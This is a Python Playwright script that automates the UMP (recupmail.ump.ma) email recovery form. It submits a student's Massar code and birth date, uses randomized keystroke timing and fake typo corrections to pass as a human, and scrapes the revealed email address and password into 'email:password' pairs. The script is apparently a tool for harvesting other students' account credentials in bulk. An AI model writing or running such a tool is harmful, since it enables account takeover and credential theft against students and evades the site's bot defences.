"""
UMP RECUPMAIL ENGINE — Core verification module for http://recupmail.ump.ma/
Accurate extraction of both Email and Password from the UMP success page with double reading.
"""

import re
import time
import random

class LoginState:
    LOGIN_OK = "login_ok"
    LOGIN_ERROR = "login_error"
    SITE_ERROR = "site_error"

class UMPEngine:
    def __init__(self):
        pass

    def _human_type(self, page, selector, text):
        try:
            loc = page.locator(selector).first
            loc.click()
            page.wait_for_timeout(random.randint(200, 400))
            loc.fill("")
            
            text_str = str(text)
            
            # محاكاة شبه بشرية: إذا كان النص طويلاً، فبشكل عشوائي يكتب جزء، يمسح جوج أرقام، ويعاود يكتبهم
            should_correct = len(text_str) > 5 and random.random() > 0.5
            
            if should_correct:
                partial_text = text_str[:-2]
                for char in partial_text:
                    loc.press_sequentially(char, delay=random.randint(120, 220))
                
                for char in text_str[-2:]:
                    loc.press_sequentially(char, delay=random.randint(80, 150))
                
                # وقفة قصيرة تحاكي التردد أو التفكير
                page.wait_for_timeout(random.randint(400, 700))
                
                # مسح تراجعي لآخر رقمين (Backspace مرتين)
                for _ in range(2):
                    loc.press("Backspace")
                    page.wait_for_timeout(random.randint(150, 300))
                
                # إعادة كتابتهم من جديد
                for char in text_str[-2:]:
                    loc.press_sequentially(char, delay=random.randint(130, 250))
            else:
                # كتابة عادية متعرجة ومتروية
                for char in text_str:
                    loc.press_sequentially(char, delay=random.randint(120, 260))
                    
        except Exception:
            page.fill(selector, text)

    def run_workflow(self, page, massar, cni, dob, bac=None):
        result_data = {
            "massar": massar,
            "dob": dob,
            "status": LoginState.LOGIN_ERROR,
            "extracted_email": None,
            "detail": "Initialized"
        }

        try:
            # استقرار الصفحة مع فترات انتظار عشوائية
            page.wait_for_load_state("domcontentloaded", timeout=30000)
            page.wait_for_timeout(random.randint(1500, 2800))

            inputs = page.locator('input')
            if inputs.count() < 2:
                result_data["status"] = LoginState.SITE_ERROR
                result_data["detail"] = "Site Error: Required input fields not found"
                return result_data

            # 1. إدخال رمز مسار باستخدام المحاكاة البشرية المتقدمة
            massar_input = inputs.nth(0)
            self._human_type(page, 'input:nth-of-type(1)', massar) if inputs.count() > 0 else massar_input.fill(massar)

            page.wait_for_timeout(random.randint(800, 1400))

            # 2. إدخال تاريخ الازدياد باستخدام نفس السلوك
            dob_input = inputs.nth(1)
            self._human_type(page, 'input:nth-of-type(2)', dob) if inputs.count() > 1 else dob_input.fill(dob)

            page.wait_for_timeout(random.randint(1000, 1800))

            # الضغط على زر الإرسال ("CONNEXION") مع وقفة عشوائية قبله
            submit_clicked = False
            for btn_sel in ['button:has-text("CONNEXION")', 'button:has-text("Connexion")', 'button[type="submit"]', 'input[type="submit"]', '.btn']:
                try:
                    btn = page.locator(btn_sel).first
                    if btn.count() > 0:
                        page.wait_for_timeout(random.randint(300, 600))
                        btn.click()
                        submit_clicked = True
                        break
                except Exception:
                    continue
            if not submit_clicked:
                page.wait_for_timeout(random.randint(300, 600))
                page.locator('button').first.click()

            # القراءة المزدوجة للنتائج مع تأخيرات زمنية آمنة
            page.wait_for_timeout(random.randint(3500, 4800))
            body_text_1 = page.locator("body").inner_text()
            page.wait_for_timeout(random.randint(2000, 3000))
            body_text = page.locator("body").inner_text()

            # التحقق من الأخطاء
            error_keywords = ["invalide", "incorrect", "الرقم أو تاريخ", "غير صحيح", "veuillez", "erreur"]
            low_text = body_text.lower()
            low_text_1 = body_text_1.lower()
            if any(kw in low_text for kw in error_keywords) or any(kw in low_text_1 for kw in error_keywords):
                result_data["status"] = LoginState.LOGIN_ERROR
                result_data["detail"] = "Failed: Incorrect Code Massar or DOB (Login Error)"
                return result_data

            # استخراج البريد الإلكتروني وكلمة المرور بدقة من صفحة النجاح
            email_match = re.search(r'([\w\.-]+@[\w\.-]+\.[a-zA-Z]{2,})', body_text)
            
            extracted_pwd = None
            pwd_pat = re.search(r'([A-Z][0-9]{9}@[0-9]{4})', body_text)
            if pwd_pat:
                extracted_pwd = pwd_pat.group(1)
            else:
                lines = body_text.splitlines()
                for i, line in enumerate(lines):
                    if "mot de passe" in line.lower() and i + 1 < len(lines):
                        extracted_pwd = lines[i+1].strip()
                        break

            if not extracted_pwd:
                extracted_pwd = "UnknownPwd"

            if email_match or "email" in low_text or "prénom" in low_text:
                extracted_email = email_match.group(1) if email_match else "Extracted_Email"
                result_data["status"] = LoginState.LOGIN_OK
                result_data["extracted_email"] = f"{extracted_email}:{extracted_pwd}"
                result_data["detail"] = f"Success | Email: {extracted_email} | Password: {extracted_pwd}"
            else:
                result_data["status"] = LoginState.LOGIN_ERROR
                result_data["detail"] = "Failed: Success elements not found"

        except Exception as e:
            result_data["status"] = LoginState.SITE_ERROR
            result_data["detail"] = f"Site Error / Exception: {type(e).__name__}"

        return result_data